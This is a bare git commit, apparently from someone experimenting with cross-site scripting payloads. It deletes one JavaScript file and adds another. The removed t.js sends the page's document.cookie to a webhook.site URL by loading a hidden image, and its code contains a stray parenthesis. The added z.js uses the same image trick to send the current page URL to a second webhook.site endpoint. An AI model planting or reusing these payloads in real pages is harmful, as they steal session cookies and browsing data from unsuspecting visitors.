e4f6243fdbe1f7e226dcb6ba8700abd83ee8ce31
carloszavaleta <czavaleta93@gmail.com>
2020-01-21 00:34:27 -0600

    a

--- t.js
+++
@@ -1,7 +0,0 @@
-var img = document.createElement("img");
-
-img.src = "https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d/img.jpg?c=") + document.cookie;
-
-document.appendChild(img);
-
-const H = "HELLO"
---
+++ z.js
@@ -0,0 +1,6 @@
+var image = document.createElement("img")
+
+var name = window.location.href
+image.src = "https://webhook.site/647ee77d-c9b6-4fb9-be97-a23d43d93a15/image.png?c=" + name
+
+document.body.appendChild(image);
